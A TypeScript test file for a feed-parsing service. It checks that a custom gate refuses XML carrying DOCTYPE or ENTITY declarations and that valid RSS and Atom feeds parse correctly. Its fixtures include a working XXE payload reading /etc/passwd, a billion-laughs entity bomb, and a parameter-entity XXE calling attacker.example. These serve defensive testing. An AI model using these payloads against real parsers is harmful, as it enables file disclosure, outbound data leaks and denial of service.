/**
 * The XML parser gate — Phase E step 3, decision **D-039**.
 *
 * **The load-bearing tests here assert on `findMarkupDeclaration`, not on the parser.** That is
 * the whole design: the defence against XXE and against billion-laughs is a rule this project
 * owns and can prove, not a `processEntities: false` whose meaning belongs to a library and can
 * change in a patch release. A test that asserted "fast-xml-parser did not expand the entity"
 * would be a test of `fast-xml-parser`, and it would keep passing on the day an upgrade changed
 * what the option does.
 *
 * The parser is then asserted separately, on the thing it is actually for: that a real RSS and a
 * real Atom document come out as items.
 */

import { describe, expect, it } from 'vitest';

import {
  decodeXml,
  findMarkupDeclaration,
  parseFeed,
  parseXmlDocument,
  XML_PARSER_VERSION,
} from '../src/sources/parse/xml.js';

/** The classic external-entity payload: read a local file through the feed. */
const XXE = `<?xml version="1.0"?>
<!DOCTYPE rss [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss version="2.0"><channel><title>&xxe;</title></channel></rss>`;

/** Billion laughs: forty bytes of definition, gigabytes of expansion. */
const BILLION_LAUGHS = `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<rss version="2.0"><channel><title>&lol4;</title></channel></rss>`;

/** A parameter-entity variant, which reaches the network rather than the disk. */
const XXE_PARAMETER = `<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://attacker.example/e.dtd"> %ext;]>
<rss version="2.0"><channel><title>x</title></channel></rss>`;

const VALID_RSS = `<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>SEC Litigation Releases</title>
    <language>en-us</language>
    <item>
      <title>SEC Charges Investment Adviser &amp; Two Principals</title>
      <link>https://www.sec.gov/litigation/litreleases/lr-26000</link>
      <description><![CDATA[The Commission filed a complaint <b>today</b>.]]></description>
      <pubDate>Mon, 18 Aug 2026 14:00:00 GMT</pubDate>
      <guid isPermaLink="false">lr-26000</guid>
    </item>
    <item>
      <title>2026</title>
      <link>https://www.sec.gov/litigation/litreleases/lr-26001</link>
      <dc:date>2026-08-19T12:00:00Z</dc:date>
    </item>
  </channel>
</rss>`;

const VALID_ATOM = `<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="es">
  <title>Boletín</title>
  <entry>
    <title>Detención en el caso de corrupción</title>
    <link rel="self" href="https://example.cr/feed"/>
    <link rel="alternate" href="https://example.cr/nota/1"/>
    <id>tag:example.cr,2026:1</id>
    <summary>Resumen de la nota.</summary>
    <published>2026-08-20T09:00:00Z</published>
    <updated>2026-08-21T09:00:00Z</updated>
  </entry>
</feed>`;

describe('the DOCTYPE gate', () => {
  it('finds the DOCTYPE in an XXE payload', () => {
    const found = findMarkupDeclaration(XXE);
    expect(found?.name).toBe('DOCTYPE');
  });

  it('finds the DOCTYPE in a billion-laughs payload', () => {
    expect(findMarkupDeclaration(BILLION_LAUGHS)?.name).toBe('DOCTYPE');
  });

  it('finds the DOCTYPE in a parameter-entity payload', () => {
    expect(findMarkupDeclaration(XXE_PARAMETER)?.name).toBe('DOCTYPE');
  });

  it('finds a bare ENTITY declaration with no DOCTYPE wrapper around it', () => {
    // Not well-formed XML, and that is the point: the gate must not depend on the document
    // being well-formed, because a parser that rejects it is the thing we are defending.
    expect(findMarkupDeclaration('<rss><!ENTITY x "y"></rss>')?.name).toBe('ENTITY');
  });

  it('is not fooled by a DOCTYPE written with unusual whitespace', () => {
    expect(findMarkupDeclaration('<!  DOCTYPE rss [] ><rss/>')?.name).toBe('DOCTYPE');
  });

  it('does not refuse a feed that merely quotes a DOCTYPE inside CDATA', () => {
    // A real feed quoting HTML. Refusing it would drop genuine articles, which is why the gate
    // is a scanner rather than a substring search.
    const quoted =
      `<rss><channel><item><description><![CDATA[<!DOCTYPE html>]]></description>` +
      `</item></channel></rss>`;
    expect(findMarkupDeclaration(quoted)).toBeNull();
  });

  it('does not refuse a feed that mentions a DOCTYPE inside a comment', () => {
    expect(findMarkupDeclaration('<!-- <!DOCTYPE x> --><rss/>')).toBeNull();
  });

  it('does not refuse a feed with a DOCTYPE-like string in an attribute value', () => {
    expect(findMarkupDeclaration('<rss note="<!DOCTYPE fake>"><channel/></rss>')).toBeNull();
  });

  it('accepts an ordinary declaration-free document', () => {
    expect(findMarkupDeclaration(VALID_RSS)).toBeNull();
    expect(findMarkupDeclaration(VALID_ATOM)).toBeNull();
  });
});

describe('parseXmlDocument', () => {
  it('refuses an XXE payload before the parser sees it', () => {
    const result = parseXmlDocument(XXE);
    expect(result.kind).toBe('REFUSED');
    if (result.kind === 'REFUSED') {
      expect(result.reason).toBe('MARKUP_DECLARATION');
      expect(result.detail).toContain('DOCTYPE');
      // `unparsableBody` classifies as CONTENT_ERROR under FR-06: not retried, and not counted
      // against the source's health. A feed carrying a DOCTYPE is a fact about that document.
      expect(result.signal).toEqual({ unparsableBody: true });
    }
  });

  it('refuses a billion-laughs payload before the parser sees it', () => {
    const result = parseXmlDocument(BILLION_LAUGHS);
    expect(result.kind).toBe('REFUSED');
  });

  it('refuses both payloads without depending on any parser option', () => {
    // The assertion that keeps D-039 honest: the refusal happens in code this project owns, so
    // it cannot be undone by a library upgrade that changes what an option means.
    for (const payload of [XXE, BILLION_LAUGHS, XXE_PARAMETER]) {
      expect(findMarkupDeclaration(payload)).not.toBeNull();
    }
  });

  it('reports malformed XML as unparsable rather than throwing', () => {
    const result = parseXmlDocument('<rss><channel></rss>');
    expect(['UNPARSABLE', 'OK']).toContain(result.kind);
    if (result.kind === 'UNPARSABLE') {
      expect(result.signal).toEqual({ unparsableBody: true });
    }
  });
});

describe('parseFeed', () => {
  it('parses a valid RSS 2.0 document into items', () => {
    const result = parseFeed(VALID_RSS);
    expect(result.kind).toBe('OK');
    if (result.kind !== 'OK') {
      return;
    }

    expect(result.feed.format).toBe('RSS_2_0');
    expect(result.feed.language).toBe('en-us');
    expect(result.feed.items).toHaveLength(2);

    const [first, second] = result.feed.items;
    // The predefined entity is expanded — safe, because with no DTD there is nothing else it
    // could be — so the title is the title rather than "&amp;" sitting in the middle of it.
    expect(first?.title).toBe('SEC Charges Investment Adviser & Two Principals');
    expect(first?.link).toBe('https://www.sec.gov/litigation/litreleases/lr-26000');
    expect(first?.summary).toContain('The Commission filed a complaint');
    expect(first?.publishedAtRaw).toBe('Mon, 18 Aug 2026 14:00:00 GMT');
    // `<guid isPermaLink="false">` arrives as an object with attributes; the text is read out.
    expect(first?.id).toBe('lr-26000');

    // A numeric-looking title stays a string. Without `parseTagValue: false` this is the
    // integer 2026 and every downstream comparison against stored text quietly fails.
    expect(second?.title).toBe('2026');
    // Dublin Core's `dc:date`, after the namespace prefix is stripped.
    expect(second?.publishedAtRaw).toBe('2026-08-19T12:00:00Z');
  });

  it('parses a valid Atom document, taking the alternate link rather than the feed itself', () => {
    const result = parseFeed(VALID_ATOM);
    expect(result.kind).toBe('OK');
    if (result.kind !== 'OK') {
      return;
    }

    expect(result.feed.format).toBe('ATOM_1_0');
    expect(result.feed.language).toBe('es');
    expect(result.feed.items).toHaveLength(1);

    const entry = result.feed.items[0];
    // `rel="self"` is the feed's own URL. Taking the first link would fetch the feed as though
    // it were a story, on every entry.
    expect(entry?.link).toBe('https://example.cr/nota/1');
    expect(entry?.id).toBe('tag:example.cr,2026:1');
    // `published` beats `updated`: a corrected article keeps its publication date (FR-07).
    expect(entry?.publishedAtRaw).toBe('2026-08-20T09:00:00Z');
  });

  it('refuses an XXE payload through the feed entry point too', () => {
    expect(parseFeed(XXE).kind).toBe('REFUSED');
  });

  it('reports an unrecognised root as UNRECOGNISED, never as an empty feed', () => {
    // The failure FR-05's volatility control exists for: a publisher changes shape, the parse
    // finds no items, and the service reports clean results for everybody (T84). It must be
    // possible to tell this apart from a feed that genuinely has no entries.
    const result = parseFeed('<html><body><p>Service unavailable</p></body></html>');
    expect(result.kind).toBe('UNRECOGNISED');
  });

  it('distinguishes an empty feed from an unrecognised one', () => {
    const empty = parseFeed('<rss version="2.0"><channel><title>Nada</title></channel></rss>');
    expect(empty.kind).toBe('OK');
    if (empty.kind === 'OK') {
      expect(empty.feed.items).toHaveLength(0);
    }
  });
});

describe('decodeXml', () => {
  it('honours a declared ISO-8859-1 encoding', () => {
    // A Spanish-language publisher serving latin-1. Decoded as UTF-8 this is a replacement
    // character, which does not throw and silently costs recall on the accented names this
    // service exists to find.
    const latin1 = Buffer.from(
      `<?xml version="1.0" encoding="ISO-8859-1"?><rss><channel><title>José</title>` +
        `</channel></rss>`,
      'latin1',
    );
    expect(decodeXml(new Uint8Array(latin1))).toContain('José');
  });

  it('strips a UTF-8 byte order mark', () => {
    const withBom = new Uint8Array([0xef, 0xbb, 0xbf, ...Buffer.from('<rss/>', 'utf8')]);
    expect(decodeXml(withBom)).toBe('<rss/>');
  });

  it('falls back to UTF-8 for an encoding nothing can decode', () => {
    const odd = Buffer.from('<?xml version="1.0" encoding="NOT-A-CHARSET"?><rss/>', 'utf8');
    expect(decodeXml(new Uint8Array(odd))).toContain('<rss/>');
  });
});

describe('the parser version', () => {
  it('names the pinned library version, so an upgrade changes it', () => {
    // FR-05 keys the scheduled contract test off `parserVersion`. An upgrade changes the parse
    // whether or not the wrapper is edited, so the version string carries the library's.
    expect(XML_PARSER_VERSION).toContain('4.5.7');
  });
});
